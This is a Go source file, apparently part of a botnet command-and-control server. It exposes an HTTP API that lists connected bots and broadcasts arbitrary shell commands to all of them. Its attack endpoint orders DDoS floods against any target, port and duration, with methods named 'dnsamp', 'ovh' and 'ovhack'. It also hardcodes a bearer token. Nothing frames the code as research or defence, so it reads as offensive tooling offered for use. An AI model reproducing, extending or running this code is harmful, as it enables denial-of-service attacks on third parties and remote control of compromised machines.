package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"sync"
)

var (
	apiToken    = "supersecrettoken"
	bots        = make(map[int]*Bot)
	botsMutex   = sync.Mutex{}
)

func authenticate(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		token := r.Header.Get("Authorization")
		if token != "Bearer "+apiToken {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

func listBotsHandler(w http.ResponseWriter, r *http.Request) {
	botsMutex.Lock()
	defer botsMutex.Unlock()

	type botInfo struct {
		ID   int    `json:"id"`
		Addr string `json:"address"`
	}

	botList := []botInfo{}
	for id, bot := range bots {
		botList = append(botList, botInfo{id, bot.addr})
	}

	json.NewEncoder(w).Encode(botList)
}

func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
	type request struct {
		Command string `json:"command"`
	}

	var req request
	err := json.NewDecoder(r.Body).Decode(&req)
	if err != nil || req.Command == "" {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	botsMutex.Lock()
	defer botsMutex.Unlock()
	for id, bot := range bots {
		_, err := bot.conn.Write([]byte(req.Command + "\n"))
		if err != nil {
			fmt.Printf("Failed to send command to bot %d: %v\n", id, err)
		}
	}

	w.Write([]byte("Command broadcast to bots"))
}

func attackHandler(w http.ResponseWriter, r *http.Request) {
	type req struct {
		Method   string `json:"method"`
		Target   string `json:"target"`
		Port     int    `json:"port"`
		Duration int    `json:"duration"`
	}

	var data req
	err := json.NewDecoder(r.Body).Decode(&data)
	if err != nil || data.Method == "" || data.Target == "" || data.Duration <= 0 {
		http.Error(w, "Invalid attack request", http.StatusBadRequest)
		return
	}

	cmd := ""

	switch strings.ToLower(data.Method) {
	case "dnsamp":
		cmd = fmt.Sprintf("dnsamp %s %d", data.Target, data.Duration)
	case "ovh":
		if data.Port == 0 {
			http.Error(w, "Port required for ovh", http.StatusBadRequest)
			return
		}
		cmd = fmt.Sprintf("ovh %s %d %d", data.Target, data.Port, data.Duration)
	case "ovhack":
		if data.Port == 0 {
			http.Error(w, "Port required for ovhack", http.StatusBadRequest)
			return
		}
		cmd = fmt.Sprintf("ovhack %s %d %d", data.Target, data.Port, data.Duration)
	default:
		http.Error(w, "Unsupported method", http.StatusBadRequest)
		return
	}

	botsMutex.Lock()
	defer botsMutex.Unlock()
	for id, bot := range bots {
		_, err := bot.conn.Write([]byte(cmd + "\n"))
		if err != nil {
			fmt.Printf("Failed to send attack to bot %d: %v\n", id, err)
		}
	}

	w.Write([]byte("Attack command sent"))
}

func botCountHandler(w http.ResponseWriter, r *http.Request) {
	botsMutex.Lock()
	defer botsMutex.Unlock()
	count := len(bots)
	w.Write([]byte(strconv.Itoa(count)))
}

func main() {
	http.HandleFunc("/bots", authenticate(listBotsHandler))
	http.HandleFunc("/command", authenticate(sendCommandHandler))
	http.HandleFunc("/attack", authenticate(attackHandler))
	http.HandleFunc("/count", authenticate(botCountHandler))

	fmt.Println("API server listening on :8080")
	http.ListenAndServe(":8080", nil)
}
